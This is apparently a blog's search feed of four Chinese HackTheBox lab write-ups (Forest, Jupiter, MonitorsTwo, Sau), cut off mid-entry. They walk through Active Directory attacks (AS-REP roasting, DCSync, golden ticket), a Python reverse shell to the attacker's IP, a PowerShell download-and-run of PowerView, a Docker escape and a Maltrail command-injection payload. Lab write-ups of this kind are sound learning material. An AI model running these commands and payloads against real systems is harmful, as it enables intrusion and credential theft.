<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Forest - HackTheBox</title>
    <link href="/2023/07/22/Forest-HackTheBox/"/>
    <url>/2023/07/22/Forest-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>年轻人的第一台Windows靶机</p><p>没打过Windows靶机，这台用来熟悉一下套路，收集了国内外很多Writeup总结一下大伙的技术和思路</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xrHIst4ffi.png" alt=""></p><h4 id="区域传输"><a href="#区域传输" class="headerlink" title="区域传输"></a>区域传输</h4><p>失败</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_GqFcJ1o4JP.png" alt=""></p><h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><p>没有匿名共享目录</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_lRDqPZiCky.png" alt=""></p><h4 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h4><p>RPC远程过程调用枚举用户，拿到了用户和用户组信息</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_uiQj0W8ZPd.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7kmZCIKFhO.png" alt=""></p><p>查找对应的管理员组及管理员信息</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HTyGLSaBeN.png" alt=""></p><h4 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">enum4linux -v 10.10.10.161<br></code></pre></td></tr></table></figure><h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><h4 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h4><p>拿到了用户名，这里又暴露了kerberos端口。直接尝试一下AS-REP Roasting攻击。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> user in $(cat user.txt);<span class="hljs-keyword">do</span> python3 examples/GetNPUsers.py -no-pass -dc-ip <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.161</span> htb/$&#123;user&#125; | grep -v impacket;done<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_r-PfYEK1Uj.png" alt=""></p><p>拿到了svc-alfresco用户的hash，这里使用john进行破解，得到密码s3rvice</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IZ7Pk1R-Ib.png" alt=""></p><h4 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h4><p>拥有账号密码可以直接利用evil-winrm连接</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7dB8sev2Tg.png" alt=""></p><h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><h4 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h4><ol><li>自行搭建好BloodHound</li><li>使用bloodhound-python进行信息收集</li><li>将收集到的信息（json文件）上传到BloodHound进行分析</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -c all -ns 10.10.10.161<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_USoKCwUulk.png" alt=""></p><p><img src="C:\Users\aurey\Downloads\Compressed\Forest\image\image_z7bQv1dJEF.png" alt=""></p><p><strong>Shortest Path from Owned Principals</strong></p><p>可以发现svc-alfresco在Account Operators组中，该组的成员可以创建和修改大多数类型的帐户，包括用户、本地组和全局组的帐户。</p><p>参考：<a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators" title="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#account-operators</a></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Og5lUwZJPE.png" alt=""></p><p><strong>Find Shortest Paths to Domain Admins</strong></p><p>分析到达Domain Admins的最短路径</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-xJi6br8uD.png" alt=""></p><p>Account Operators组对Exchange Windows Permissions组拥有Generic ALL权限</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li>添加一个用户到Exchange Windows Permissions组中</li><li>利用Exchange Windows Permissions组的WriteDACL授予用户DCSync权限</li><li>通过DCSync进行域同步并窃取用户哈希</li></ol><p>添加用户至Exchange Windows Permissions 组</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_RqBqBzOhA2.png" alt=""></p><p>借助 PowerSploit 中的 powerview.ps1 来滥用<code>WriteDacl</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iex(New-Object Net.webclient).downloadstring(<span class="hljs-string">&#x27;http://10.10.16.76:8000/PowerView.ps1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>创建凭证对象并授予 DCSync 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$pass</span> = convertto-securestring <span class="hljs-string">&#x27;passwd123&#x27;</span> -AsPlainText -Force<br><span class="hljs-variable">$cred</span> = New-Object System.Management.Automation.PSCredential (<span class="hljs-string">&#x27;HTB\aurey&#x27;</span>, <span class="hljs-variable">$pass</span>)<br>Add-DomainObjectAcl -Credential <span class="hljs-variable">$cred</span> -TargetIdentity <span class="hljs-string">&quot;DC=htb,DC=local&quot;</span> -PrincipalIdentity aurey -Rights DCSync<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MHATzSpUXl.png" alt=""></p><h4 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h4><p>DCSync可从利用DRS协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据</p><p>使用impacket的secretdump.py获取hash值</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_TswtwKGVJ4.png" alt=""></p><p>使用 <a href="http://wmiexec.py" title="wmiexec.py">wmiexec.py</a> 通过哈希传递连接管理员</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_4WPcocAXUc.png" alt=""></p><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>我们可以通过DCSync拿到的krbtgt做一个黄金票据</p><ol><li>获取Domain SID</li></ol><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_oVPzDl3xKL.png" alt=""></p><ol><li>利用上面获取到的Domain SID和krbtgt制作黄金票据</li></ol><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_iWj0__81hD.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_mNcoq0Dbco.png" alt=""></p><h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h3><p>第一台Windows靶机，算是学习一下套路。跟Linux靶机比较大的区别是需要一定的前置知识</p><p>感觉需要整理一些东西，再开始打后面的Windows靶机：</p><ul><li>Windows常见端口以及对应服务的打法</li><li>回顾Windows域渗透用到的各种方法</li></ul><h4 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h4><ul><li>Official WriteUp</li><li><a href="https://amirr0r.github.io/posts/htb-forest/" title="https://amirr0r.github.io/posts/htb-forest/">https://amirr0r.github.io/posts/htb-forest/</a></li><li><a href="https://www.freebuf.com/articles/system/325765.html" title="https://www.freebuf.com/articles/system/325765.html">https://www.freebuf.com/articles/system/325765.html</a></li><li><a href="https://medium.com/@sinfulz/hackthebox-forest-walkthrough-248fce6fc90d" title="https://medium.com/@sinfulz/hackthebox-forest-walkthrough-248fce6fc90d">https://medium.com/@sinfulz/hackthebox-forest-walkthrough-248fce6fc90d</a></li><li><a href="https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-forest/" title="https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-forest/">https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-forest/</a></li><li><a href="https://infosecwriteups.com/htb-forest-write-up-fdd45e8e73bf" title="https://infosecwriteups.com/htb-forest-write-up-fdd45e8e73bf">https://infosecwriteups.com/htb-forest-write-up-fdd45e8e73bf</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jupiter - HackTheBox</title>
    <link href="/2023/07/18/Jupiter-HackTheBox/"/>
    <url>/2023/07/18/Jupiter-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>年轻人的第一台Medium靶机，没想到这么逆天</p><p>开局先扫描</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dFWdzTPsfA.png" alt=""></p><h3 id="体验功能"><a href="#体验功能" class="headerlink" title="体验功能"></a>体验功能</h3><p>很漂亮的页面</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_LE8jgMM2m3.png" alt=""></p><p>主页翻了半天什么都没有，目录、js接口什么都找不到。实在没办法去看了一下writeup</p><h3 id="虚拟主机扫描"><a href="#虚拟主机扫描" class="headerlink" title="虚拟主机扫描"></a>虚拟主机扫描</h3><p>使用gobuster vhost爆破到了<code>kiosk.jupiter.htb</code>虚拟主机名，算是学到新姿势了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__JojbIIcXD.png" alt=""></p><p>一个Grafana&#x20;</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OoJTVk8IMy.png" alt=""></p><p>使用API执行SQL语句（这还是Google找到的，国内都是分享某个漏洞）</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_qkUEi3Ct-P.png" alt=""></p><h3 id="PostgreSQL-RCE"><a href="#PostgreSQL-RCE" class="headerlink" title="PostgreSQL RCE"></a>PostgreSQL RCE</h3><p>可以执行postgres SQL了，进一步利用参考</p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce">https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce</a></p><p>直接试试RCE</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_n2RS9v0OEw.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_VHMTzmoQWH.png" alt=""></p><p>拿下 （本以为可以开始提权了就可以美滋滋拿下一台Medium靶机了，没想到这才是噩梦的开始</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JTsMmB1RUj.png" alt=""></p><h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_L7hs3nx1mL.png" alt=""></p><p>PEASS找到了一些信息但没法直接提权，用pspy看一下进程试试</p><p>可以看到jovian有在运行jupyter</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ur2AveS-BM.png" alt=""></p><p>juno会运行<code>/home/juno/shadow-simulation.sh</code> 和</p><p><code>/home/juno/.local/bin/shadow /dev/shm/network-simulation.yml</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ixPaGBJpTp.png" alt=""></p><p>查了一下shadow命令是用来管理密码的，我们看看<code>/dev/shm/network-simulation.yml</code>是什么内容</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_jVr_y52xbe.png" alt=""></p><p>感觉是个CS架构的脚本，python开个服务端，curl作为客户端去请求</p><p>进程中也是这样</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_0-RM-2GSip.png" alt=""></p><p>脚本由juno执行，拥有它的权限，我直接写一手公钥，实现免密登录</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-CbluHyD9r.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_TMLnDluvHe.png" alt=""></p><p>记得给<code>/tmp/test</code>打上777权限，以防juno没权限。静待片刻，就可以免密登录了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_hr6VPekhTL.png" alt=""></p><p>终于拿下User Flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dmIOcuwQpl.png" alt=""></p><p>脚本里的内容跟我们在进程里看到的一致</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_6GsKGo9rG3.png" alt=""></p><h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><p>进程信息发现jovian开了jupyter-notebook跑脚本<code>/opt/solar-flares/flares.ipynb</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gVhKvuN2pc.png" alt=""></p><p>PATH这里似乎有得利用</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_kMD6EKET4R.png" alt=""></p><p>端口开了不少</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_r_Lfxl6TXk.png" alt=""></p><p>这里显示我们可以修改<code>/opt/solar-flares</code>下的一些文件，还记得jovian用户执行的Jupyter文件吗，可惜我们不能直接改那个脚本</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cJrI2qkaDg.png" alt=""></p><p>上面开了挺多端口，外部都访问不到。我们这里考虑整个隧道进去</p><h4 id="两层端口转发"><a href="#两层端口转发" class="headerlink" title="两层端口转发"></a>两层端口转发</h4><p>VPS上将靶机的3000端口转发到VPS的3000端口上</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_990DP69Aqq.png" alt=""></p><p>本地将VPS的3000端口转发到本地的3000端口上</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gLsTUXn2jg.png" alt=""></p><p>即可通过本地访问到靶机中的<code>127.0.0.1:3000</code>，这里还是那个Grafana，我看看8888是什么</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gZguUUq3QC.png" alt=""></p><p>8888是一台Jupyter</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_YRctifwFk3.png" alt=""></p><p>参考一下exploit-notes，我们可以找到token直接登录Jupyter，然后Jupyter的控制台可以执行命令，通过之前的进程可以看到这是jovian在跑的，拿下它就可以拿到jovian的权限了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Wj6n1DHgC9.png" alt=""></p><p><a href="https://exploit-notes.hdks.org/exploit/machine-learning/jupyter-notebook-pentesting/">https://exploit-notes.hdks.org/exploit/machine-learning/jupyter-notebook-pentesting/</a></p><p>一手grep拿下token</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aAx83pgF9E.png" alt=""></p><p>利用ipynb反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">import socket,os,pty;s=socket.socket();s.connect((&quot;<span class="hljs-number">10.10</span>.<span class="hljs-number">16.76</span>&quot;, <span class="hljs-number">9999</span>));[os.dup2(s.fileno(),fd) <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> (0,1,2)];pty.spawn(<span class="hljs-string">&quot;bash&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_p7vfDE27bY.png" alt=""></p><p>看到这里允许sudo，我并没有密码，希望是个免密sudo</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_U0Y9ZBcli9.png" alt=""></p><p>非常nice</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5DJxf9v0jf.png" alt=""></p><p>执行一下发现提示我们没有配置文件</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_EAOEoEe7YG.png" alt=""></p><p>但是没用过sattrack这个工具，没有文档看</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-iruoxmxss.png" alt=""></p><p>上网搜了一下，其他地方啥都搜不到，只能看这篇论文了。我是真没想到打个靶机还得看论文…</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_SXgQnoh2jC.png" alt=""></p><p>论文里也是一顿介绍，只能知道这是一个卫星轨道预测和实时跟踪程序，并没有具体的用法和命令。</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_GcMV3rK-pg.png" alt=""></p><p>只能发挥一下CTF余热，strings一下看看能不能发现什么</p><p><code>/tmp/config.json</code>不存在，有可能就是sattrack想要的配置文件</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_3T22lTH-O9.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_PUti8NGbiu.png" alt=""></p><p>我们创建一个再执行命令，确实现在没有提示找不到配置文件了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_4Pz7xB-tUP.png" alt=""></p><p>但是这配置文件还是不知道怎么写，后面想起<code>/usr/local/share</code>一般会放一些配置案例</p><p>直接find开找</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CauIjEU8d4.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7Kj00JOFDl.png" alt=""></p><p>复制过来执行一下，这里似乎会去下载tlesources指定的文件。</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HDiUE-9v9E.png" alt=""></p><p>试一下把tlesources改成flag的地址</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_W7FS4heVMt.png" alt=""></p><p>终于拿下了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Rme1oSXEWw.png" alt=""></p><h4 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h4><p>太折磨了，主要也是我打得断断续续的（每天下班时间打一下，公司一下又断开回家打）。这波打下来还是学到很多的（虚拟主机扫描、通过Grafana 打PostgreSQL GetShell、用户定时任务脚本提权、两层端口转发打内网服务、恶心的没用过的软件提权）</p><p>而且这个sattrack提权还没有writeup，大伙都是有<code>/usr/local/bin/sattrack</code>读写权限，直接</p><p><code>cp /bin/bash /usr/local/bin/sattrack</code>再<code>sudo /bin/bash</code>就完事了 😓（官方在一个月前修复了这个Bug）</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image-20230718234530269.png" alt=""></p><p>最后，狠狠的给他打个8分（虽然我还没打过Hard</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vjsWQXlpIr.png" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MonitorsTwo - HackTheBox</title>
    <link href="/2023/07/16/MonitorsTwo-HackTheBox/"/>
    <url>/2023/07/16/MonitorsTwo-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>端口还没扫完，直接浏览器访问一下，Google一搜，RCE</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Q6F88cIx3M.png" alt=""></p><h3 id="CVE-2022-46169-CACTI-1-2-22"><a href="#CVE-2022-46169-CACTI-1-2-22" class="headerlink" title="CVE-2022-46169-CACTI-1.2.22"></a>CVE-2022-46169-CACTI-1.2.22</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vlWca8mr7s.png" alt=""></p><p>直接拿下</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_bnxOO6aQgw.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NQThyjlhnm.png" alt=""></p><h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><p>但是www-data用户连家目录都无，这里没有找到user flag</p><p>直接上Linpeas 收集一下信息，发现了一个脚本 <code>entrypoint.sh</code>和两个数据库密码</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_t7OuKTMMe5.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JNh6xed6cX.png" alt=""></p><p>这里也是一个连接数据库的脚本，倒是发现了有个host为db的数据库</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_9IMi2gGAqP.png" alt=""></p><p>db的地址找不到，不过有个<code>172.19.0.3</code>，我们可以尝试连接</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8zDCX02DIY.png" alt=""></p><p>结果就是失败了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8i6wujwPhZ.png" alt=""></p><p>这里是在没办法了，去网上找了一下writeup，发现大伙使用 <code>getent</code>发现的数据库地址</p><blockquote><p><code>getent</code> 命令用来查看系统的数据库中的相关记录。即使这些数据库不是在本地，比如 ldap 或者 nis 中的数据库，也可以使用 getent 查看。</p></blockquote><h4 id="Docker-逃逸"><a href="#Docker-逃逸" class="headerlink" title="Docker 逃逸"></a>Docker 逃逸</h4><p>登录MySQL成功，本来想在mysql.user里面查信息的，结果Password这一列直接被删。于是转战cacti</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_H3B7f1i3PQ.png" alt=""></p><p>使用john爆破一下，得出明文密码</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MBtQQHdVmg.png" alt=""></p><p>拿下User Flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xhl4G00v7d.png" alt=""></p><h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><p>SUID和sudo看了一下是没有了，直接上linpeas再查查</p><p>倒是发现了个at提权漏洞</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ggdaCi7uMz.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gMjX2tx9ck.png" alt=""></p><p>结果环境里就没有安装gcc…</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_E2jbbHVlqA.png" alt=""></p><p>又在linpeas里面翻了很久，根据里面的信息可以察觉到这里和CACTI（上面那个Shell）应该是两个机器，根据进程信息可以判断这边应该跑着Docker，CACTI可能就是个容器</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Wz-LAKfkiI.png" alt=""></p><p>于是查一下Docker版本看看有没有nday</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_s1KagKh6AJ.png" alt=""></p><p>还真有，该漏洞允许非特权Linux用户访问和运行容器内的程序。</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7P_NAmATET.png" alt=""></p><p>找到EXP直接开冲：<a href="https://github.com/UncleJ4ck/CVE-2021-41091" title="https://github.com/UncleJ4ck/CVE-2021-41091">https://github.com/UncleJ4ck/CVE-2021-41091</a></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8VoeEON5zC.png" alt=""></p><p>但是跑完之后还是没成功嘛，认真看一下，我们需要先在容器内给<code>/bin/bash</code> 加上SUID</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aQYhSIoU6I.png" alt=""></p><p>又回到CACTI里面提权，SUID这里发现了<code>capsh</code>可以进行提权</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dRVimB8E8u.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CiVOFKRHht.png" alt=""></p><p>再回去试试</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zL_9eQzyj8.png" alt=""></p><p>拿下！这台靶机，开局直接送个Shell，我还在想这也太简单了。结果是个Container环境，还得Docker逃逸，整体还是挺有收获的</p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sau - HackTheBox</title>
    <link href="/2023/07/15/Sau-HackTheBox/"/>
    <url>/2023/07/15/Sau-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>开局先扫一下，发现只有22和55555端口可以访问</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_VAkKigqcJ4.png" alt=""></p><p>进去直接看到开源项目了都</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xP0f5_NGN8.png" alt=""></p><p>看介绍这是一个收集HTTP请求并且可以展示和检阅它们的一个简单的Web服务</p><p>看开源项目的时候留意到最新的Release已经是v1.2.3了，按照HackTheBox的套路，一般都是nday（听大佬说的）所以Google查一下有没有可利用的nday</p><p>果然Google一查就有了（CVE-2023-27163）</p><h3 id="GetShell-过程"><a href="#GetShell-过程" class="headerlink" title="GetShell 过程"></a>GetShell 过程</h3><h4 id="CVE-2023-27163"><a href="#CVE-2023-27163" class="headerlink" title="CVE-2023-27163"></a>CVE-2023-27163</h4><p>研究一下找到的POC：<a href="https://github.com/entr0pie/CVE-2023-27163" title="https://github.com/entr0pie/CVE-2023-27163">https://github.com/entr0pie/CVE-2023-27163</a></p><p>这是一个SSRF漏洞，通过这个脚本就能简单的利用</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_BKNxZ6ZdaA.png" alt=""></p><p>我也试一下，确实是可以的</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_G3MypS21zZ.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_b4GizETLLm.png" alt=""></p><p>成功了但这样跑POC好像没啥用，还不知道漏洞详细情况，于是找到了关于这个漏洞更详细的介绍：</p><p><a href="https://notes.sjtu.edu.cn/s/MUUhEymt7#" title="https://notes.sjtu.edu.cn/s/MUUhEymt7#">https://notes.sjtu.edu.cn/s/MUUhEymt7#</a></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_CAbd47AZjs.png" alt=""></p><p>原来就是这个forward_url存在漏洞，根据文章提示，创建完Baskets之后要访问一下才能触发</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_sDuk0s9XMi.png" alt=""></p><p>我也试试看</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_9w8v6vXA6N.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OkJ7I-RTya.png" alt=""></p><p>成功了，但还是不知道能干啥，不过可以发现这里的HTTP Request信息是我的本地浏览器的</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_X8-5u6xQNS.png" alt=""></p><p>这里想破脑袋也找了很多文章，都没找到SSRF无回显在这种情况下有什么用。但是上面的nc监听的消息里发现，其实它会来GET我指定的内容。回想起端口扫描的时候filtered的80和8338端口，我们能不能让服务器去GET这些内容呢？</p><p>这里指定<code>forward_url</code>为<code>127.0.0.1:80</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_57fdSqqUTc.png" alt=""></p><p>结果还是没用…</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-YgCXLeHOx.png" alt=""></p><p>留意到<code>&quot;proxy_response&quot;: false</code> 试了一下改成<code>true</code>行不行</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_efG6PM5KOq.png" alt=""></p><p>逆天…还真就行了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2naG2hEYyk.png" alt=""></p><p>访问一下发现也是个项目，老规矩搜一下nday</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_SnDN41b2J0.png" alt=""></p><h4 id="Maltrail-RCE"><a href="#Maltrail-RCE" class="headerlink" title="Maltrail RCE"></a>Maltrail RCE</h4><p>这东西没有申请CVE，exploitdb搜不到，不过Google查到了</p><p><a href="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/" title="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/</a></p><p>文章里表示这样就能执行命令了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&#x27;http://hostname:8338/login&#x27;</span> \<br>  --data <span class="hljs-string">&#x27;username=;`id &gt; /tmp/bbq`&#x27;</span><br></code></pre></td></tr></table></figure><p>结合上面的测试，这个服务会把我们的HTTP Request带过去，正好可以通过SSRF打</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-n4kYto8Q7.png" 